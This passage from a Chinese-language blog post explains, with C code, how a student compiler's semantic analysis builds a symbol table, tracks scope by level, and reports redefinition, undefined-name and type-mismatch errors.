class="string">&quot;---------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;new_table.index;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\t&quot;</span>,new_table.symbols[i].name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>,new_table.symbols[i].level);</span><br><span class="line">        <span class="keyword">if</span>(new_table.symbols[i].type==INT)</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;%s\t&quot;</span>,<span class="string">&quot;int&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(new_table.symbols[i].type==FLOAT)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\t&quot;</span>,<span class="string">&quot;float&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\t&quot;</span>,<span class="string">&quot;char&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\t&quot;</span>,new_table.symbols[i].flag);</span><br><span class="line">        <span class="keyword">if</span>(new_table.symbols[i].flag==<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,new_table.symbols[i].paramnum);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>作用域</strong></p>
<p>在语义分析过程中，各个变量名有其对应的作用域，并且一个作用域内不允许名字重复</p>
<ul>
<li>通过层号 level 来管理，level 的初始值为 “0”</li>
<li>在处理外部变量名以及函数名时，对应符号的层号值固定为 “0”</li>
<li>处理函数形式参数时，固定形参名在填写符号表时，层号值固定为 1”</li>
<li>每到一个复合语句，则层号 level 加“1”，退出时减“1”</li>
</ul>
<p>通过 <code>symboltable</code> 和 <code>symbol_scope_begin</code> 这两个栈结构的配合，就可以实现作用域的变量区分</p>
<p>具体的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> COMP_STM:</span><br><span class="line">    flag=<span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">    command=<span class="number">0</span>;</span><br><span class="line">    new_scope.TX[new_scope.top]=new_table.index; <span class="comment">/* index压栈 */</span></span><br><span class="line">    new_scope.top++;</span><br><span class="line">    Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command); <span class="comment">// 分析定义列表</span></span><br><span class="line">    command=<span class="number">1</span>;</span><br><span class="line">    Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level+<span class="number">1</span>,flag,command); <span class="comment">// 分析语句列表</span></span><br><span class="line">    DisplaySymbolTable(); <span class="comment">/* 显示符号表 */</span></span><br><span class="line">    new_table.index=new_scope.TX[new_scope.top<span class="number">-1</span>]; <span class="comment">/* index弹出 */</span></span><br><span class="line">    new_scope.top--;</span><br><span class="line">    <span class="keyword">if</span> (new_scope.top == <span class="number">0</span>)</span><br><span class="line">        DisplaySymbolTable(); <span class="comment">/* 显示符号表 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>分析定义列表和语句列表时会向 <code>symboltable</code> 添加新的条目，同时进行报错分析（检查是否重复，是否合法等）</li>
<li>在分析完成之后 <code>symboltable.index</code> 会进行更新，此时 <code>symboltable</code> 中新添加的条目会被弃用</li>
<li>这样处理之后，同级语句块之间的分析过程不会相互干扰（父层还是会影响子层的分析）</li>
</ul>
<p><strong>定义与使用</strong></p>
<p>核心函数的声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Semantic_Analysis</span><span class="params">(struct node* T,<span class="keyword">int</span> type,<span class="keyword">int</span> level,<span class="keyword">char</span> flag,<span class="keyword">int</span> command)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>其中最后一个参数 <code>command</code> 就是用来决定是“定义”还是“使用”</li>
</ul>
<p>通过上述代码也可以看出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> COMP_STM:</span><br><span class="line">    flag=<span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">    command=<span class="number">0</span>;</span><br><span class="line">	.....</span><br><span class="line">    Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command); <span class="comment">// 分析定义列表</span></span><br><span class="line">    command=<span class="number">1</span>;</span><br><span class="line">    Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level+<span class="number">1</span>,flag,command); <span class="comment">// 分析语句列表</span></span><br><span class="line">	.....</span><br></pre></td></tr></table></figure>
<ul>
<li>在一个语句块中：<ul>
<li>前面所有的变量都会被当做“定义”</li>
<li>后面所有的变量都会被当做“使用”</li>
</ul>
</li>
<li>这样写的话会有一些问题，在如下代码中：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a1=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> a2=a1;</span><br></pre></td></tr></table></figure>
<ul>
<li>程序会把 <code>a1</code> 当成“定义”，从而去遍历符号表造成冲突</li>
<li>如果对赋值语句 ASSIGNOP 进行特殊处理又会出现其他的 BUG（主要是因为该程序采用递归的方法来遍历 AST，如果一个地方特殊处理，会导致很多地方发生连锁反应）</li>
</ul>
<p><strong>报错分析</strong></p>
<p>常见错误类型如下：</p>
<ul>
<li>变量在使用时未定义</li>
<li>函数在调用时为经定义</li>
<li>变量出现重复定义或变量域前面定义过的其它语法结构重名</li>
<li>函数出现重复定义</li>
<li>赋值号两边的表达式类型不匹配</li>
<li>赋值号左边只有一个右值的表达式（包括：赋值号右边无值）</li>
<li>操作数类型不匹配或操作数类型域操作符不撇皮（例如：整形变量域数组变量相加减）</li>
<li>return 语句的返回类型域函数定义的返回类型不匹配</li>
<li>函数调用时实参或形参的数目或类型不匹配</li>
</ul>
<p>大概可以分为两类：重复定义，使用时未定义，类型不匹配</p>
<p>判断前两点都比较好实现：</p>
<ul>
<li>重复定义：我们只需要在新的符号进入符号表 <code>symboltable</code> 之前，先判断它是否已经存在于符号表中</li>
<li>使用时未定义：在使用某个符号时，先遍历符号表 <code>symboltable</code> 看看它是否存于其中</li>
</ul>
<p>详细代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ID: <span class="comment">// 检测新的变量名是否唯一</span></span><br><span class="line">    i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(new_table.symbols[i].level!=level&amp;&amp;i&lt;new_table.index) <span class="comment">// 转到相同作用域</span></span><br><span class="line">        i++;</span><br><span class="line">    <span class="keyword">if</span>(command==<span class="number">0</span>)&#123; <span class="comment">// 定义变量</span></span><br><span class="line">        <span class="keyword">while</span>(i&lt;new_table.index)&#123; <span class="comment">/* 遍历并判断是否相同 */</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(new_table.symbols[i].name,T-&gt;type_id)==<span class="number">0</span> &amp;&amp; new_table.symbols[i].flag==flag)&#123;</span><br><span class="line">                <span class="keyword">if</span>(flag==<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：全局变量中出现相同变量名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(flag==<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数定义中出现了相同的函数名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(flag==<span class="string">&#x27;T&#x27;</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：局部变量中出现了相同的变量名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数参数中中出现了相同的变量名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="comment">/* 若不同则可以加入 */</span></span><br><span class="line">        <span class="built_in">strcpy</span>(new_table.symbols[new_table.index].name,T-&gt;type_id);</span><br><span class="line">        new_table.symbols[new_table.index].level=level;</span><br><span class="line">        new_table.symbols[new_table.index].type=type;</span><br><span class="line">        new_table.symbols[new_table.index].flag=flag;</span><br><span class="line">        new_table.index++;</span><br><span class="line">        <span class="keyword">return</span> new_table.symbols[i].type; <span class="comment">/* 这里需要返回类型(类型匹配时有用) */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="comment">// 使用变量</span></span><br><span class="line">        i=new_table.index<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span>)&#123; <span class="comment">/* 遍历并判断是否出现 */</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(new_table.symbols[i].name,T-&gt;type_id)==<span class="number">0</span>&amp;&amp;</span><br><span class="line">               (new_table.symbols[i].flag==<span class="string">&#x27;V&#x27;</span>||</span><br><span class="line">                new_table.symbols[i].flag==<span class="string">&#x27;T&#x27;</span>||</span><br><span class="line">                new_table.symbols[i].flag==<span class="string">&#x27;P&#x27;</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> new_table.symbols[i].type;</span><br><span class="line">            &#125;</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：变量名%s未定义\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于函数的定义和调用，同样也需要遍历符号表：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> FUNC_CALL:</span><br><span class="line">    j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(new_table.symbols[j].level==<span class="number">0</span>&amp;&amp;j&lt;new_table.index)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(new_table.symbols[j].name,T-&gt;type_id)==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(new_table.symbols[j].flag!=<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数名%s在符号表中定义为变量\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(new_table.symbols[j].level==<span class="number">1</span>||j==new_table.index)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数%s未定义\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    type=new_table.symbols[j+<span class="number">1</span>].type;</span><br><span class="line">    counter=<span class="number">0</span>;</span><br><span class="line">    Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command); <span class="comment">// 分析参数</span></span><br><span class="line">    <span class="keyword">if</span>(new_table.symbols[j].paramnum!=counter)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数调用%s参数个数不匹配\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">    <span class="keyword">return</span> new_table.symbols[j].type;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>最后注意返回该函数的返回类型（为了后续的类型匹配）</li>
</ul>
<p>类型不匹配则要分为以下几种情况：</p>
<ul>
<li>赋值语句类型不匹配（暂时不考虑自动类型转换）</li>
<li>函数调用的参数类型不匹配</li>
<li>函数调用的返回值不匹配</li>
</ul>
<p>详细代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ASSIGNOP:</span><br><span class="line"><span class="keyword">case</span> OR:</span><br><span class="line"><span class="keyword">case</span> AND:</span><br><span class="line"><span class="keyword">case</span> RELOP:</span><br><span class="line"><span class="keyword">case</span> PLUS:</span><br><span class="line"><span class="keyword">case</span> MINUS:</span><br><span class="line"><span class="keyword">case</span> STAR:</span><br><span class="line"><span class="keyword">case</span> DIV:</span><br><span class="line"><span class="keyword">case</span> COMADD:</span><br><span class="line"><span class="keyword">case</span> COMSUB:</span><br><span class="line">    type1=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">    type2=Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">    <span class="keyword">if</span>(type1==type2)</span><br><span class="line">        <span class="keyword">return</span> type1;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：赋值类型不匹配\n&quot;</span>,T-&gt;pos);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里有个小细节需要注意：<code>int a=1;</code> 和 <code>int a; a=1;</code> 是不同的</li>
<li>第一种情况是函数 <code>Semantic_Analysis</code> 执行时，<code>a</code> 没有在符号表中</li>
<li>第二种情况是函数 <code>Semantic_Analysis</code> 执行时，<code>a</code> 已经在符号表中</li>
<li>对于这两种情况都要返回 <code>a</code> 的类型 <code>new_table.symbols[i].type</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ARGS:</span><br><span class="line">    counter++;</span><br><span class="line">    t=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">    <span class="keyword">if</span>(type!=t)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数调用的第%d个参数类型不匹配\n&quot;</span>,T-&gt;pos,counter);</span><br><span class="line">    type=new_table.symbols[j+counter+<span class="number">1</span>].type;</span><br><span class="line">    Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数参数的类型匹配需要借助全局变量 counter 来定位</li>
</ul>
<p><strong>符号表构建</strong></p>
<p>接下来的工作就是针对不同的节点类型来执行对应的操作，主要还是通过递归来遍历 AST 中的各个节点</p>
<p>完整代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Semantic_Analysis</span><span class="params">(struct node* T,<span class="keyword">int</span> type,<span class="keyword">int</span> level,<span class="keyword">char</span> flag,<span class="keyword">int</span> command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> type1,type2;</span><br><span class="line">    <span class="keyword">if</span>(T)&#123;</span><br><span class="line">        <span class="keyword">switch</span>(T-&gt;kind)&#123;</span><br><span class="line">            <span class="keyword">case</span> EXT_DEF_LIST:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> EXT_VAR_DEF:<span class="comment">//外部变量声明</span></span><br><span class="line">                type=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ARRAY_DEF:</span><br><span class="line">                type = Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ARRAY_DEC:</span><br><span class="line">                flag = <span class="string">&#x27;A&#x27;</span>;<span class="comment">//Array</span></span><br><span class="line">                <span class="built_in">strcpy</span>(new_table.symbols[new_table.index].name,T-&gt;type_id);</span><br><span class="line">                new_table.symbols[new_table.index].level=level;</span><br><span class="line">                new_table.symbols[new_table.index].type=type;</span><br><span class="line">                new_table.symbols[new_table.index].flag=flag;</span><br><span class="line">                new_table.index++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> TYPE:</span><br><span class="line">                <span class="keyword">return</span> T-&gt;type;</span><br><span class="line">            <span class="keyword">case</span> EXT_DEC_LIST:</span><br><span class="line">                flag=<span class="string">&#x27;V&#x27;</span>;</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ID:<span class="comment">//检测新的变量名是否唯一</span></span><br><span class="line">                i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(new_table.symbols[i].level!=level&amp;&amp;i&lt;new_table.index)<span class="comment">//转到相同作用域</span></span><br><span class="line">                    i++;</span><br><span class="line">                <span class="keyword">if</span>(command==<span class="number">0</span>)&#123;<span class="comment">//定义变量</span></span><br><span class="line">                    <span class="keyword">while</span>(i&lt;new_table.index)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(new_table.symbols[i].name,T-&gt;type_id)==<span class="number">0</span> &amp;&amp; new_table.symbols[i].flag==flag)&#123;</span><br><span class="line">                            <span class="keyword">if</span>(flag==<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：全局变量中出现相同变量名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                            <span class="keyword">else</span> <span class="keyword">if</span>(flag==<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数定义中出现了相同的函数名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                            <span class="keyword">else</span> <span class="keyword">if</span>(flag==<span class="string">&#x27;T&#x27;</span>)</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：局部变量中出现了相同的变量名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数参数中中出现了相同的变量名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        i++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">strcpy</span>(new_table.symbols[new_table.index].name,T-&gt;type_id);</span><br><span class="line">                    new_table.symbols[new_table.index].level=level;</span><br><span class="line">                    new_table.symbols[new_table.index].type=type;</span><br><span class="line">                    new_table.symbols[new_table.index].flag=flag;</span><br><span class="line">                    new_table.index++;</span><br><span class="line">                    <span class="keyword">return</span> new_table.symbols[i].type;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;<span class="comment">//使用变量</span></span><br><span class="line">                    i=new_table.index<span class="number">-1</span>;</span><br><span class="line">                    <span class="keyword">while</span>(i&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(new_table.symbols[i].name,T-&gt;type_id)==<span class="number">0</span>&amp;&amp;(new_table.symbols[i].flag==<span class="string">&#x27;V&#x27;</span>||new_table.symbols[i].flag==<span class="string">&#x27;T&#x27;</span>||new_table.symbols[i].flag==<span class="string">&#x27;P&#x27;</span>))&#123;</span><br><span class="line">                            <span class="keyword">return</span> new_table.symbols[i].type;</span><br><span class="line">                        &#125;</span><br><span class="line">                        i--;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(i&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：变量名%s未定义\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FUNC_DEF:<span class="comment">//函数声明</span></span><br><span class="line">                type=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level+<span class="number">1</span>,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,<span class="number">1</span>,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">2</span>],type,<span class="number">1</span>,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FUNC_DEC:</span><br><span class="line">                <span class="built_in">strcpy</span>(new_table.symbols[new_table.index].name,T-&gt;type_id);</span><br><span class="line">                new_table.symbols[new_table.index].level=<span class="number">0</span>;</span><br><span class="line">                new_table.symbols[new_table.index].type=type;</span><br><span class="line">                new_table.symbols[new_table.index].flag=<span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">                new_table.index++;</span><br><span class="line">                counter=<span class="number">0</span>;</span><br><span class="line">  